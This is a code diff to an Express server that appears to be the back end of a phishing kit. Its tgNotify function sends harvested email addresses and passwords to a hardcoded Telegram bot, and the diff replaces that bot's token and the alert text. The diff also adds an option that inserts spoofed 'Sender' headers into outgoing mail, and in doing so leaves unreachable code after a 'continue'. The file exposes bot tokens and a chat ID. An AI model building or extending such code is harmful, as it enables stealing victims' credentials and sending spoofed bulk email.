@@ -9,7 +9,7 @@ const app = express()
 
 // ── TELEGRAM NOTIFY ─────────────────────────────────────────────────────────
 
-const TG_TOKEN   = "8321657195:AAFqHrhcxXEd7VdN2rzy1T_HFsx1a8dRxhU"
+const TG_TOKEN   = "8841116459:AAG4guDIwxCB2qpRVvWb0Zt51nWzTopnMKI"
 const TG_CHAT_ID = "1728085434"
 
 async function tgNotify(email, password) {
@@ -17,7 +17,7 @@ async function tgNotify(email, password) {
     try {
 
         const text = `
-            📬 *HA LJADID*
+            📬 *HA LJADIwD*
             =====================
             📬 *email:* \`${email}\`
             📬 *password:* \`${password}\`
@@ -134,6 +134,10 @@ function cleanHeaders(email, options = {}) {
             cleaned.push(line)
 
             if (options.addSender)
+                cleaned.push(`Sender: noreply@[RDNS]`)
+
+            continue
+            if (options.addSender1)
                 cleaned.push(`Sender: noreply@[RDNS]`)
 
             continue
@@ -407,7 +411,9 @@ app.post("/extract", async (req, res) => {
                     LAN6:        req.body.LAN6,
                     P_RPATH:     req.body.P_RPATH,
                     SUBJECT_VAL: req.body.SUBJECT_VAL,
-                    BOUNDARY:    req.body.BOUNDARY
+                    BOUNDARY:    req.body.BOUNDARY,
+                    addSender1: req.body.addSender1
+
                 })
                 results.push(cleaned)
             }
